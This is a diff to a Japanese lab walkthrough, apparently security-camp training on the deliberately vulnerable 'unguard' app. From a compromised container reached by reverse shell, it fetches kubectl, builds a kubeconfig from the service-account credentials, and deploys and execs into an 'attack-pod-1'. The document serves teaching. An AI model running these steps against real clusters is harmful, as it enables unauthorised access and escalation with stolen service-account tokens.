@@ -57,8 +57,14 @@ unguard-proxy-service-5b84d8dd85-xz2rr
 
 ```bash
 [unguard-proxy-service]: cd /tmp/
-[unguard-proxy-service]: curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+# 軽量版kubectlを試す場合
+[unguard-proxy-service]: KUBECTL_VERSION=$(wget -qO- https://dl.k8s.io/release/stable.txt)
+[unguard-proxy-service]: wget -O kubectl "https://dl.k8s.io/release/${KUBECTL_VERSION}/bin/linux/amd64/kubectl"
 [unguard-proxy-service]: chmod +x kubectl
+# クライアント版のみ確認（ネットワーク接続不要）
+[unguard-proxy-service]: ./kubectl version --client --output=yaml
+# リバースシェル環境では --request-timeout オプションを使用
+[unguard-proxy-service]: ./kubectl version --request-timeout=5s 2>&1 || echo "Server connection timed out"
 ```
 
 次にコンテナ内に保存されているサービスアカウントのクレデンシャルから `kubeconfig` ファイルを作成します。
@@ -89,7 +95,8 @@ users:
 作成した `kubeconfig` を指定し、`kubectl` で Kubernetes API サーバーにアクセスできるようになりました。
 
 ```bash
-[unguard-proxy-service]: ./kubectl auth whoami --kubeconfig kubeconfig
+# リバースシェル環境では --request-timeout を設定
+[unguard-proxy-service]: ./kubectl auth whoami --kubeconfig kubeconfig --request-timeout=10s
 ATTRIBUTE                                           VALUE
 Username                                            system:serviceaccount:unguard:unguard-proxy
 UID                                                 e56b64e1-4415-4ee8-9cdf-78026924a7e5
@@ -135,7 +142,7 @@ apiVersion: v1
 kind: Pod
 metadata:
   name: attack-pod-1
-  namespace: unguard
+  namespace: seccamp-app
 spec:
   containers:
   - name: ubuntu-container
@@ -158,7 +165,7 @@ Pod のマニフェストファイルを作成し、クラスタにデプロイ�
 [unguard-proxy-service]: ./kubectl apply -f pod.yaml --kubeconfig kubeconfig
 pod/attack-pod-1 created
 
-[unguard-proxy-service]: ./kubectl get po -n unguard --kubeconfig kubeconfig -o wide | grep attack
+[unguard-proxy-service]: ./kubectl get po -n seccamp-app --kubeconfig kubeconfig -o wide | grep attack
 attack-pod-1                                  1/1     Running     0          9s     10.0.0.16    kind-worker          <none>           <none>
 ```
 
@@ -169,7 +176,7 @@ attack-pod-1                                  1/1     Running     0          9s 
 作成した Pod の ubuntu コンテナに Exec します。
 
 ```bash
-[unguard-proxy-service]: ./kubectl exec -it -n unguard --kubeconfig kubeconfig attack-pod-1 -- bash
+[unguard-proxy-service]: ./kubectl exec -it -n seccamp-app --kubeconfig kubeconfig attack-pod-1 -- bash
 
 [attack-pod-1]: cat /etc/hostname
 attack-pod-1
